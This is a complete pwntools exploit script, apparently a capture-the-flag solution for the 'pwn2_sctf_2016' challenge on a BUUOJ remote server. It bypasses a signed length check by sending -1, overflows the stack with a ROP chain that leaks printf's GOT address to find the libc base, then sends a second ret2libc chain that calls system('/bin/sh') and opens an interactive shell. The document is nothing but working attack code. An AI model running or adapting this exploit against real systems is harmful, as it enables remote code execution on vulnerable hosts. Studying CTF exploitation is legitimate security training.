from pwn import *

context.log_level = 'debug'
# io = process('pwn2_sctf_2016')
io = remote('node4.buuoj.cn', 26988)
elf = ELF('pwn2_sctf_2016')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
main_addr = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
YouSaidS = 0x080486F8
pp_ret = 0x0804864e 

io.sendlineafter('How many bytes do you want me to read? ', '-1')
payload = cyclic(0x30) + p32(printf_plt) + p32(main_addr) + p32(YouSaidS) + p32(printf_got)
io.sendlineafter('Ok, sounds good. Give me 4294967295 bytes of data!\n', payload)
io.recvline()
io.recvuntil('You said: ')
libc_base = u32(io.recvn(4)) - libc.symbols['printf']
log.success('libc_base: ' + hex(libc_base))

io.sendlineafter('How many bytes do you want me to read? ', '-1')
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(0x30) + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)
io.sendlineafter('Ok, sounds good. Give me 4294967295 bytes of data!\n', payload)
io.interactive()

